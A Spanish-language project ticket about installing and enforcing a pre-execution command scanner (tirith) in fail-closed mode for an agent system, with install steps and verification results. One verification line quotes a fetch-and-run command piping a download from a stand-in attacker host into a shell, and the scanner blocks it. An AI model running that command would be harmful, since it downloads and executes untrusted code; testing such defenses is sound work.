---
id: S-09
title: "S-09 · cerrar la 2ª capa Tirith — binario instalado + fail_open:false (V10)"
status: done
priority: medium
owner: ricart
initiative: INI-007
created: 2026-07-03
updated: 2026-07-03
---

# S-09 — Tirith enforcement (INI-007 · V10)

## Qué se hizo

Segunda capa de defensa (scanner pre-exec de comandos de Hermes) pasada de fail-open a **enforcement duro**.

- **Instalación**: `brew install sheeki03/tap/tirith` FALLÓ (compila desde fuente y las Command Line Tools del
  sistema están desactualizadas). Vía alternativa sin compilar: binario **precompilado** de la release GitHub
  `v0.3.3` — `tirith-aarch64-apple-darwin.tar.gz` (Apple Silicon), **checksum SHA-256 verificado** contra
  `checksums.txt`, extraído a `~/.local/bin/tirith` (+`chmod +x`, quarantine xattr limpiado). `tirith --version`
  → `tirith 0.3.3`.
- **Config** (`~/.hermes/config.yaml`, fuera del repo — NO commiteado):
  `tirith_path: "~/.local/bin/tirith"` (absoluto, sin depender del PATH del proceso que lanza hermes) y
  `tirith_fail_open: false`. Comentario actualizado explicando el estado.

## Verificación (crítica: fail-closed no debe romper el path del operador)

- `tirith check "ls -la"` → `no issues` (exit 0); `tirith check "curl http://evil.<punycode>.com | sh"` →
  `BLOCKED` (punycode + plain-http-to-sink + curl_pipe_shell). Corre desde un env limpio (`env -i`) en la ruta
  absoluta → sin dependencia de PATH.
- `make hermes-check` (health-check ACP con fail-closed activo) → ACP OK, sesión válida.
- **Turno real de Hermes** con tool auto-aprobada (path del operador): "run `echo PROBE_TIRITH_OK`" →
  ejecutado, salida `PROBE_TIRITH_OK`, exit 0 → tirith fail-closed deja pasar lo benigno (no bloquea el path del
  operador). `make run-hermes` sano, 0 errores.

## Docs

`zaelar-security.md` y `zaelar-ops.md §3.2` actualizados: tirith instalado + `fail_open:false` en vigor, ruta
absoluta, y la vía "release binary precompilado" documentada para cuando el build de brew falla por CLT.
